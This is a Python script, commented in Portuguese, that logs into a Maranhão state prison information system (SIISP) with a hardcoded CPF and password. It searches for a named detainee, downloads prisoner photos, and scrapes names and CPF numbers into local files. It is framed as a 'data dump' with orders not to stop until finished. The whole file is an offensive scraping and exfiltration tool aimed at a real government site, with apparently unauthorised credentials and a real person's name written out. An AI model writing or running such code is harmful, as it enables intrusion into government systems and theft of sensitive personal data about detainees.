#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP - Dump de Dados - VERSAO FINAL
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Ordem: SÓ PARAR QUANDO FINALIZADO

ESTRATÉGIA: Buscar por nome específico de detento encontrado nas notificações
"""

import requests
import urllib3
from bs4 import BeautifulSoup
import re
import warnings
from bs4 import XMLParsedAsHTMLWarning

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://siisp.ma.gov.br/SIISP"
CPF = "035.176.123-32"
SENHA = "marlon89"

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def extract_viewstate(html):
    vs_match = re.search(r'javax\.faces\.ViewState.*?value="([^"]+)"', html)
    if vs_match:
        return vs_match.group(1)
    vs_match2 = re.search(r'j_id1:javax\.faces\.ViewState:\d+.*<\!\[CDATA\[([^\]]+)\]\]>', html)
    if vs_match2:
        return vs_match2.group(1)
    soup = BeautifulSoup(html, "html.parser")
    vs_input = soup.find("input", {"name": "javax.faces.ViewState"})
    if vs_input:
        return vs_input.get("value", "")
    return ""

print("="*60)
print("  SIISP - DUMP DE DADOS")
print("="*60)

# ==================== LOGIN ====================
print("\n[*] LOGIN")
r1 = session.get(f"{BASE_URL}/login", allow_redirects=True, timeout=30)
vs = extract_viewstate(r1.text)

login_data = {
    "form": "form",
    "cpf": CPF,
    "senha": SENHA,
    "javax.faces.ViewState": vs,
    "btLogin": "btLogin",
}

r2 = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=True, timeout=30)
print(f"  Login: {r2.status_code} -> {r2.url}")

# ==================== BUSCAR DETENTO ESPECIFICO ====================
print("\n[*] BUSCAR DETENTO POR NOME")

id_url = f"{BASE_URL}/preso/identificacaoPessoa"
r3 = session.get(id_url, allow_redirects=True, timeout=30)
vs3 = extract_viewstate(r3.text)
print(f"  ViewState: {vs3[:40]}...")

# Buscar por "VINICIUS GUILHERME AGUIAR SOARES" - apareceu nas notificações
busca_data = {
    "form": "form",
    "itNome": "VINICIUS GUILHERME AGUIAR SOARES",
    "itRg": "",
    "itCpf": "",
    "itNomeMae": "",
    "itNomePai": "",
    "cdNascimento_input": "",
    "javax.faces.ViewState": vs3,
    "btnBuscarDetento": "btnBuscarDetento",
}

print(f"\n  [*] Buscando: VINICIUS GUILHERME AGUIAR SOARES")
r4 = session.post(id_url, data=busca_data, allow_redirects=True, timeout=30)
print(f"  Status: {r4.status_code}, Tamanho: {len(r4.text)} bytes")

with open("siisp_busca_nome.html", "w", encoding="utf-8") as f:
    f.write(r4.text)

# Analisar
soup4 = BeautifulSoup(r4.text, "html.parser")
text = soup4.get_text()

# Verificar se encontrou algo
if "VINICIUS" in text:
    print(f"\n  [+] DETENTO ENCONTRADO!")
    
    # Extrair dados
    # Procurar tabelas com dados
    tables = soup4.find_all("table")
    for i, table in enumerate(tables):
        rows = table.find_all("tr")
        if len(rows) > 1:
            headers = table.find_all("th")
            if headers:
                print(f"\n  Tabela {i}: {[h.get_text(strip=True) for h in headers]}")
                for row in rows[1:4]:
                    cells = row.find_all("td")
                    data = [c.get_text(strip=True) for c in cells]
                    if data:
                        print(f"    {data}")
    
    # Procurar fotos
    imgs = soup4.find_all("img")
    for img in imgs:
        src = img.get("src", "")
        if src and "foto" in src.lower():
            print(f"\n  [+] FOTO: {src}")
            # Download
            foto_url = f"{BASE_URL}{src}" if src.startswith("/") else src
            r_foto = session.get(foto_url, timeout=30)
            if r_foto.status_code == 200:
                with open(f"foto_detento.jpg", "wb") as f:
                    f.write(r_foto.content)
                print(f"  [+] FOTO SALVA: foto_detento.jpg")
else:
    print(f"\n  [-] Detento não encontrado na página")

# ==================== BUSCAR POR CPF PROPRIO ====================
print("\n[*] BUSCAR POR CPF DO USUARIO")

r5 = session.get(id_url, allow_redirects=True, timeout=30)
vs5 = extract_viewstate(r5.text)

busca_cpf = {
    "form": "form",
    "itNome": "",
    "itRg": "",
    "itCpf": CPF,
    "itNomeMae": "",
    "itNomePai": "",
    "cdNascimento_input": "",
    "javax.faces.ViewState": vs5,
    "btnBuscarDetento": "btnBuscarDetento",
}

print(f"\n  [*] Buscando CPF: {CPF}")
r6 = session.post(id_url, data=busca_cpf, allow_redirects=True, timeout=30)
print(f"  Status: {r6.status_code}, Tamanho: {len(r6.text)} bytes")

with open("siisp_busca_cpf_proprio.html", "w", encoding="utf-8") as f:
    f.write(r6.text)

soup6 = BeautifulSoup(r6.text, "html.parser")
text6 = soup6.get_text()

if "não encontrado" in text6.lower() or "nenhum" in text6.lower():
    print(f"\n  [~] CPF não encontrado como detento")
else:
    print(f"\n  [+] Resultado encontrado!")
    # Procurar dados
    inputs = soup6.find_all("input", {"value": True})
    for inp in inputs:
        name = inp.get("name", "")
        value = inp.get("value", "")
        if value and name:
            print(f"    {name}: {value}")

# ==================== ACESSAR PAGINA MIGRACAO ====================
print("\n[*] ACESSAR PAGINA MIGRACAO")

mig_url = f"{BASE_URL}/preso/migracaoDetento"
r7 = session.get(mig_url, allow_redirects=True, timeout=30)
print(f"  Status: {r7.status_code} -> {r7.url}")

with open("siisp_migracao.html", "w", encoding="utf-8") as f:
    f.write(r7.text)

soup7 = BeautifulSoup(r7.text, "html.parser")
text7 = soup7.get_text()

# Procurar dados pessoais
nomes = re.findall(r'([A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]+)', text7)
if nomes:
    print(f"\n  [+] NOMES:")
    for n in list(set(nomes))[:10]:
        print(f"    {n}")

cpfs = re.findall(r'\d{3}\.\d{3}\.\d{3}-\d{2}', text7)
if cpfs:
    print(f"\n  [+] CPFs:")
    for c in list(set(cpfs))[:10]:
        print(f"    {c}")

# Procurar fotos
imgs = soup7.find_all("img")
for img in imgs:
    src = img.get("src", "")
    if src and "foto" in src.lower():
        print(f"\n  [+] FOTO ENCONTRADA: {src}")
        foto_url = f"{BASE_URL}{src}" if src.startswith("/") else src
        r_foto = session.get(foto_url, timeout=30)
        if r_foto.status_code == 200:
            with open("foto_migracao.jpg", "wb") as f:
                f.write(r_foto.content)
            print(f"  [+] FOTO SALVA: foto_migracao.jpg")

print("\n" + "="*60)
print("  FIM")
print("="*60)
